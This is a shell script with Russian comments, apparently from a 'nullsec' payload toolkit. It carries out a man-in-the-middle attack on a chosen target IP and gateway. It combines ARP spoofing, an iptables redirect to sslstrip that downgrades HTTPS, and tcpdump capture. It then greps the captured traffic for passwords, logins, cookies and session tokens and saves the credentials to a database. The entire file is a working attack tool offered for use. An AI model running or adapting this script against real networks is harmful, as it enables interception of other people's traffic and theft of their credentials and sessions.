#!/bin/sh
# mitm-attack-payload.sh — Пейлоуд для MITM атак (ARP Spoofing + SSLStrip)
# Использует nullsec-lib для надежной работы
# Категория: user/mitm

# Подключение библиотеки
. /usr/lib/nullsec-lib.sh

# Заголовок пейлоуда
nullsec_payload_header "MITM Attack Suite" "2.0.0"

# Проверка аргументов
TARGET_IP="$1"
GATEWAY_IP="$2"
INTERFACE="${3:-wlan0}"

if [ -z "$TARGET_IP" ] || [ -z "$GATEWAY_IP" ]; then
    log_error "Требуются IP цели и шлюза"
    echo "Использование: $0 <target_ip> <gateway_ip> [interface]"
    echo "Пример: $0 192.168.1.100 192.168.1.1 wlan0"
    exit 1
fi

log_info "Цель: $TARGET_IP, Шлюз: $GATEWAY_IP, Интерфейс: $INTERFACE"

# Проверка зависимостей
if ! command -v arpspoof >/dev/null 2>&1; then
    log_error "arpspoof не установлен (dsniff)"
    exit 1
fi

if ! command -v sslstrip >/dev/null 2>&1; then
    log_error "sslstrip не установлен"
    exit 1
fi

# Инициализация базы данных
nullsec_init_db

# Функция для ARP spoofing
start_arp_spoofing() {
    local target="$1"
    local gateway="$2"
    local iface="$3"

    log_info "=== ЗАПУСК ARP SPOOFING ==="
    log_info "Цель: $target -> Шлюз: $gateway"

    # Включение IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Запуск ARP spoofing в фоне
    arpspoof -i "$iface" -t "$target" "$gateway" >/dev/null 2>&1 &
    ARPSPOOF_PID1=$!

    arpspoof -i "$iface" -t "$gateway" "$target" >/dev/null 2>&1 &
    ARPSPOOF_PID2=$!

    log_info "ARP spoofing запущен (PID: $ARPSPOOF_PID1, $ARPSPOOF_PID2)"

    # Сохранение PID для очистки
    echo "$ARPSPOOF_PID1 $ARPSPOOF_PID2" > /tmp/mitm_pids
}

# Функция для SSLStrip
start_sslstrip() {
    local port="${1:-8080}"

    log_info "=== ЗАПУСК SSLSTRIP ==="
    log_info "Порт: $port"

    # Создание iptables правила для перенаправления трафика
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$port"

    # Запуск sslstrip
    sslstrip -l "$port" >/dev/null 2>&1 &
    SSLSTRIP_PID=$!

    log_info "SSLStrip запущен (PID: $SSLSTRIP_PID)"

    # Сохранение PID
    echo "$SSLSTRIP_PID" >> /tmp/mitm_pids
}

# Функция для захвата трафика
start_traffic_capture() {
    local iface="$1"
    local output_file="/tmp/mitm_capture_$(date +%s).pcap"

    log_info "=== ЗАПУСК ЗАХВАТА ТРАФИКА ==="
    log_info "Файл: $output_file"

    # Запуск tcpdump для захвата HTTP трафика
    tcpdump -i "$iface" -w "$output_file" -s 0 port 80 or port 443 >/dev/null 2>&1 &
    TCPDUMP_PID=$!

    log_info "tcpdump запущен (PID: $TCPDUMP_PID)"

    # Сохранение PID
    echo "$TCPDUMP_PID" >> /tmp/mitm_pids
}

# Функция для анализа захваченного трафика
analyze_captured_data() {
    local capture_file="$1"

    log_info "=== АНАЛИЗ ЗАХВАЧЕННЫХ ДАННЫХ ==="

    if [ ! -f "$capture_file" ]; then
        log_warn "Файл захвата не найден: $capture_file"
        return 1
    fi

    # Анализ с помощью tcpdump
    local http_requests=$(tcpdump -r "$capture_file" -A -s 0 port 80 2>/dev/null | grep -c "GET\|POST")

    log_info "Найдено HTTP запросов: $http_requests"

    # Поиск учетных данных в трафике
    local credentials=$(tcpdump -r "$capture_file" -A -s 0 2>/dev/null | \
                       grep -i "password\|passwd\|login\|user" | \
                       head -10)

    if [ -n "$credentials" ]; then
        log_info "Найденные учетные данные:"
        echo "$credentials" | while read -r line; do
            log_info "  $line"
        done

        # Сохранение в базу данных
        sqlite3 "$(nullsec_get_config DB_FILE)" << EOF
INSERT INTO captured_data (type, data, timestamp, source)
VALUES ('credentials', '$credentials', '$(date)', 'mitm_$TARGET_IP');
EOF
    fi

    # Поиск cookies
    local cookies=$(tcpdump -r "$capture_file" -A -s 0 2>/dev/null | \
                   grep -i "cookie\|session" | \
                   head -5)

    if [ -n "$cookies" ]; then
        log_info "Найденные cookies:"
        echo "$cookies" | while read -r line; do
            log_info "  $line"
        done
    fi
}

# Функция очистки
cleanup() {
    log_info "=== ОЧИСТКА MITM СЕССИИ ==="

    # Остановка процессов
    if [ -f /tmp/mitm_pids ]; then
        while read -r pid; do
            if kill -0 "$pid" 2>/dev/null; then
                kill "$pid" 2>/dev/null || true
                log_debug "Остановлен процесс: $pid"
            fi
        done < /tmp/mitm_pids
        rm -f /tmp/mitm_pids
    fi

    # Восстановление iptables
    iptables -t nat -F PREROUTING 2>/dev/null || true

    # Выключение IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward

    log_info "Очистка завершена"
}

# Обработчик сигналов
trap cleanup EXIT INT TERM

# Основная логика
main() {
    # Проверка доступности целей
    if ! nullsec_ping "$TARGET_IP" 2; then
        log_error "Цель $TARGET_IP недоступна"
        exit 1
    fi

    if ! nullsec_ping "$GATEWAY_IP" 2; then
        log_error "Шлюз $GATEWAY_IP недоступен"
        exit 1
    fi

    log_info "Цели доступны, начинаем MITM атаку..."

    # Запуск ARP spoofing
    start_arp_spoofing "$TARGET_IP" "$GATEWAY_IP" "$INTERFACE"

    # Небольшая пауза для установления spoofing
    sleep 5

    # Запуск SSLStrip
    start_sslstrip 8080

    # Запуск захвата трафика
    start_traffic_capture "$INTERFACE"

    log_info "MITM атака активна. Нажмите Ctrl+C для остановки."

    # Ожидание сигнала остановки
    while true; do
        sleep 10

        # Проверка, что процессы еще работают
        if [ -f /tmp/mitm_pids ]; then
            local dead_processes=0
            while read -r pid; do
                if ! kill -0 "$pid" 2>/dev/null; then
                    dead_processes=$((dead_processes + 1))
                fi
            done < /tmp/mitm_pids

            if [ $dead_processes -gt 0 ]; then
                log_warn "Некоторые процессы MITM остановились"
                break
            fi
        fi
    done

    # Анализ захваченных данных
    analyze_captured_data "/tmp/mitm_capture_*.pcap" 2>/dev/null || true

    # Сохранение результатов в базу данных
    sqlite3 "$(nullsec_get_config DB_FILE)" << EOF
INSERT INTO payloads (name, type, status, config)
VALUES ('mitm_attack_$TARGET_IP', 'mitm_attack', 'completed', '{"target":"$TARGET_IP","gateway":"$GATEWAY_IP","interface":"$INTERFACE","timestamp":"$(date)"}');
EOF

    log_info "MITM атака завершена"
}

# Запуск основной логики
main

# Завершение
nullsec_payload_footer "MITM Attack Suite" "completed"